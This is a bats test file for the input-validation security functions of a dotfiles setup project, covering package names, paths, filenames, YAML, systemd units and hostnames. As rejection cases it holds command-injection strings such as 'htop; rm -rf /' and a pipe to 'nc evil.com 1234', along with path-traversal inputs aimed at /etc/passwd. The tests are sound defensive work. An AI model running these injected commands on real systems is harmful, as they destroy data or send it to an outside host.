#!/usr/bin/env bats

# Security function tests for Laingville setup scripts

setup() {
    cd "$BATS_TEST_DIRNAME/.."
    source ./security.functions.bash
}

# Package name validation tests
@test "validate_package_name accepts valid package names" {
    run validate_package_name "htop"
    [ "$status" -eq 0 ]
    
    run validate_package_name "curl-dev"
    [ "$status" -eq 0 ]
    
    run validate_package_name "lib32-mesa"
    [ "$status" -eq 0 ]
    
    run validate_package_name "python3.11"
    [ "$status" -eq 0 ]
    
    run validate_package_name "gcc-c++"
    [ "$status" -eq 0 ]
}

@test "validate_package_name rejects malicious package names" {
    # Command injection attempts
    run validate_package_name "htop; rm -rf /"
    [ "$status" -eq 1 ]
    
    run validate_package_name "htop && evil-command"
    [ "$status" -eq 1 ]
    
    run validate_package_name "htop | nc evil.com 1234"
    [ "$status" -eq 1 ]
    
    run validate_package_name "htop \$(evil-command)"
    [ "$status" -eq 1 ]
    
    run validate_package_name "htop\`evil-command\`"
    [ "$status" -eq 1 ]
    
    run validate_package_name "htop\\evil"
    [ "$status" -eq 1 ]
}

@test "validate_package_name rejects empty and invalid inputs" {
    run validate_package_name ""
    [ "$status" -eq 1 ]
    
    run validate_package_name " "
    [ "$status" -eq 1 ]
    
    run validate_package_name "-invalid-start"
    [ "$status" -eq 1 ]
    
    # Too long package name
    local long_name=$(printf 'a%.0s' {1..250})
    run validate_package_name "$long_name"
    [ "$status" -eq 1 ]
}

# Path traversal validation tests
@test "validate_path_traversal allows safe paths" {
    temp_dir=$(mktemp -d)
    mkdir -p "$temp_dir/safe/subdir"
    
    run validate_path_traversal "$temp_dir/safe/file.txt" "$temp_dir"
    [ "$status" -eq 0 ]
    
    run validate_path_traversal "$temp_dir/safe/subdir" "$temp_dir"
    [ "$status" -eq 0 ]
    
    run validate_path_traversal "$temp_dir" "$temp_dir"
    [ "$status" -eq 0 ]
    
    rm -rf "$temp_dir"
}

@test "validate_path_traversal blocks directory traversal attacks" {
    temp_dir=$(mktemp -d)
    
    # Classic directory traversal
    run validate_path_traversal "$temp_dir/../../../etc/passwd" "$temp_dir"
    [ "$status" -eq 1 ]
    
    # Various traversal attempts
    run validate_path_traversal "$temp_dir/../outside" "$temp_dir"
    [ "$status" -eq 1 ]
    
    run validate_path_traversal "/etc/passwd" "$temp_dir"
    [ "$status" -eq 1 ]
    
    rm -rf "$temp_dir"
}

@test "validate_path_traversal handles symlinks correctly" {
    temp_dir=$(mktemp -d)
    outside_dir=$(mktemp -d)
    
    # Create symlink pointing outside base dir
    ln -s "$outside_dir" "$temp_dir/evil_symlink"
    
    # Should block by default (allow_symlinks=false)
    run validate_path_traversal "$temp_dir/evil_symlink/file" "$temp_dir" "false"
    [ "$status" -eq 1 ]
    
    # Should also block when explicitly allowing symlinks but target is outside
    run validate_path_traversal "$temp_dir/evil_symlink/file" "$temp_dir" "true"
    [ "$status" -eq 1 ]
    
    rm -rf "$temp_dir" "$outside_dir"
}

# Filename sanitization tests
@test "sanitize_filename removes dangerous characters" {
    result=$(sanitize_filename "file<name>")
    [ "$result" = "filename" ]
    
    result=$(sanitize_filename "file:name")
    [ "$result" = "filename" ]
    
    result=$(sanitize_filename 'file"name')
    [ "$result" = "filename" ]
    
    result=$(sanitize_filename "file|name")
    [ "$result" = "filename" ]
    
    result=$(sanitize_filename "file?name")
    [ "$result" = "filename" ]
    
    result=$(sanitize_filename "file*name")
    [ "$result" = "filename" ]
}

@test "sanitize_filename removes path traversal sequences" {
    result=$(sanitize_filename "../../../etc/passwd")
    [ "$result" = "etcpasswd" ]
    
    result=$(sanitize_filename "..\\..\\windows\\system32")
    [ "$result" = "windowssystem32" ]
    
    result=$(sanitize_filename "normal../file")
    [ "$result" = "normalfile" ]
}

@test "sanitize_filename handles null bytes and whitespace" {
    # Note: This test uses printf to create actual null bytes
    result=$(sanitize_filename "$(printf 'file\x00name')")
    [ "$result" = "filename" ]
    
    result=$(sanitize_filename "  ...filename...")
    [ "$result" = "filename" ]
    
    result=$(sanitize_filename "filename   ")
    [ "$result" = "filename" ]
}

@test "sanitize_filename rejects empty results" {
    run sanitize_filename ""
    [ "$status" -eq 1 ]
    
    run sanitize_filename "..."
    [ "$status" -eq 1 ]
    
    run sanitize_filename "   "
    [ "$status" -eq 1 ]
    
    run sanitize_filename "$(printf '\x00\x00\x00')"
    [ "$status" -eq 1 ]
}

# YAML file validation tests
@test "validate_yaml_file accepts valid YAML files" {
    temp_file=$(mktemp)
    cat > "$temp_file" << 'EOF'
arch:
  pacman:
    - htop
    - curl
  aur:
    - yay
windows:
  winget:
    - Git.Git
EOF
    
    run validate_yaml_file "$temp_file"
    [ "$status" -eq 0 ]
    
    rm -f "$temp_file"
}

@test "validate_yaml_file rejects files that are too large" {
    temp_file=$(mktemp)
    
    # Create a file larger than 1KB (using small limit for testing)
    dd if=/dev/zero of="$temp_file" bs=1024 count=2 2>/dev/null
    
    run validate_yaml_file "$temp_file" 1024  # 1KB limit
    [ "$status" -eq 1 ]
    [[ "$output" =~ "too large" ]]
    
    rm -f "$temp_file"
}

@test "validate_yaml_file rejects files with too many lines" {
    temp_file=$(mktemp)
    
    # Create file with many lines
    for i in {1..15}; do
        echo "line $i" >> "$temp_file"
    done
    
    run validate_yaml_file "$temp_file" 10485760 10  # 10 line limit
    [ "$status" -eq 1 ]
    [[ "$output" =~ "too many lines" ]]
    
    rm -f "$temp_file"
}

@test "validate_yaml_file rejects files with tabs" {
    temp_file=$(mktemp)
    printf "arch:\n\tpackages:\n\t\t- htop\n" > "$temp_file"
    
    run validate_yaml_file "$temp_file"
    [ "$status" -eq 1 ]
    [[ "$output" =~ "contains tabs" ]]
    
    rm -f "$temp_file"
}

@test "validate_yaml_file handles missing files gracefully" {
    run validate_yaml_file "/nonexistent/file.yml"
    [ "$status" -eq 1 ]
}

# YAML key validation tests
@test "validate_yaml_key accepts valid keys" {
    run validate_yaml_key "arch"
    [ "$status" -eq 0 ]
    
    run validate_yaml_key "pacman"
    [ "$status" -eq 0 ]
    
    run validate_yaml_key "windows10"
    [ "$status" -eq 0 ]
    
    run validate_yaml_key "package_manager"
    [ "$status" -eq 0 ]
}

@test "validate_yaml_key rejects invalid keys" {
    run validate_yaml_key ""
    [ "$status" -eq 1 ]
    
    run validate_yaml_key "key with spaces"
    [ "$status" -eq 1 ]
    
    run validate_yaml_key "key-with-dashes"
    [ "$status" -eq 1 ]
    
    run validate_yaml_key "KEY_WITH_CAPS"
    [ "$status" -eq 1 ]
    
    run validate_yaml_key "key.with.dots"
    [ "$status" -eq 1 ]
    
    # Too long key
    local long_key=$(printf 'a%.0s' {1..60})
    run validate_yaml_key "$long_key"
    [ "$status" -eq 1 ]
}

# Systemd unit name validation tests
@test "validate_systemd_unit_name accepts valid unit names" {
    run validate_systemd_unit_name "dynamic-wallpaper.timer"
    [ "$status" -eq 0 ]
    
    run validate_systemd_unit_name "ssh.service"
    [ "$status" -eq 0 ]
    
    run validate_systemd_unit_name "user@1000.service"
    [ "$status" -eq 0 ]
    
    run validate_systemd_unit_name "my_service.service"
    [ "$status" -eq 0 ]
}

@test "validate_systemd_unit_name rejects invalid unit names" {
    run validate_systemd_unit_name ""
    [ "$status" -eq 1 ]
    
    run validate_systemd_unit_name "no-extension"
    [ "$status" -eq 1 ]
    
    run validate_systemd_unit_name "wrong.exe"
    [ "$status" -eq 1 ]
    
    run validate_systemd_unit_name "../evil.service"
    [ "$status" -eq 1 ]
    
    run validate_systemd_unit_name "evil/../good.service"
    [ "$status" -eq 1 ]
    
    # Too long name
    local long_name=$(printf 'a%.0s' {1..300})
    run validate_systemd_unit_name "${long_name}.service"
    [ "$status" -eq 1 ]
}

# Hostname validation tests
@test "validate_hostname accepts valid hostnames" {
    run validate_hostname "baljeet"
    [ "$status" -eq 0 ]
    
    run validate_hostname "server-01"
    [ "$status" -eq 0 ]
    
    run validate_hostname "web1.example.com"
    [ "$status" -eq 0 ]
    
    run validate_hostname "host123"
    [ "$status" -eq 0 ]
}

@test "validate_hostname rejects invalid hostnames" {
    run validate_hostname ""
    [ "$status" -eq 1 ]
    
    run validate_hostname "-invalid"
    [ "$status" -eq 1 ]
    
    run validate_hostname "invalid-"
    [ "$status" -eq 1 ]
    
    run validate_hostname ".invalid"
    [ "$status" -eq 1 ]
    
    run validate_hostname "invalid."
    [ "$status" -eq 1 ]
    
    run validate_hostname "inv@lid"
    [ "$status" -eq 1 ]
    
    # Too long hostname
    local long_hostname=$(printf 'a%.0s' {1..300})
    run validate_hostname "$long_hostname"
    [ "$status" -eq 1 ]
}

# Environment variable validation tests
@test "validate_environment_variable validates paths correctly" {
    temp_dir=$(mktemp -d)
    
    # Should accept paths within expected prefix
    run validate_environment_variable "TEST_DIR" "$temp_dir/subdir" "$temp_dir"
    [ "$status" -eq 0 ]
    
    # Should reject paths outside expected prefix  
    run validate_environment_variable "TEST_DIR" "/etc/passwd" "$temp_dir"
    [ "$status" -eq 1 ]
    
    rm -rf "$temp_dir"
}

@test "validate_environment_variable handles symlinks securely" {
    temp_dir=$(mktemp -d)
    outside_dir=$(mktemp -d)
    
    # Create symlink pointing outside allowed area
    ln -s "$outside_dir" "$temp_dir/evil_link"
    
    # Should reject symlinks pointing outside allowed area
    run validate_environment_variable "TEST_DIR" "$temp_dir/evil_link" "$temp_dir"
    [ "$status" -eq 1 ]
    
    rm -rf "$temp_dir" "$outside_dir"
}

# Security logging tests
@test "log_security_event logs to stderr" {
    run log_security_event "TEST" "This is a test message"
    [ "$status" -eq 0 ]
    [[ "$output" =~ "SECURITY" ]]
    [[ "$output" =~ "TEST" ]]
    [[ "$output" =~ "This is a test message" ]]
}

# Integration test for package name validation with real package manager input
@test "package validation integration test with realistic package names" {
    # Test with actual package names from Arch and AUR
    local packages=(
        "linux"
        "linux-headers"
        "base-devel"
        "git"
        "python-pip"
        "nodejs-lts-hydrogen"
        "lib32-mesa"
        "ttf-jetbrains-mono-nerd"
        "visual-studio-code-bin"
        "google-chrome"
        "1password"
        "zoom"
    )
    
    for pkg in "${packages[@]}"; do
        run validate_package_name "$pkg"
        [ "$status" -eq 0 ] || {
            echo "FAILED: Valid package name rejected: $pkg"
            return 1
        }
    done
}

# Integration test for path validation with real dotfiles structure
@test "path validation integration test with dotfiles structure" {
    temp_base=$(mktemp -d)
    dotfiles_dir="$temp_base/dotfiles/user"
    mkdir -p "$dotfiles_dir/.config/alacritty"
    mkdir -p "$dotfiles_dir/.local/bin"
    
    # Test valid dotfiles paths
    run validate_path_traversal "$dotfiles_dir/.bashrc" "$temp_base"
    [ "$status" -eq 0 ]
    
    run validate_path_traversal "$dotfiles_dir/.config/alacritty/alacritty.toml" "$temp_base"
    [ "$status" -eq 0 ]
    
    run validate_path_traversal "$dotfiles_dir/.local/bin/script" "$temp_base"
    [ "$status" -eq 0 ]
    
    # Test invalid paths that try to escape
    run validate_path_traversal "$dotfiles_dir/../../../etc/passwd" "$temp_base"
    [ "$status" -eq 1 ]
    
    rm -rf "$temp_base"
}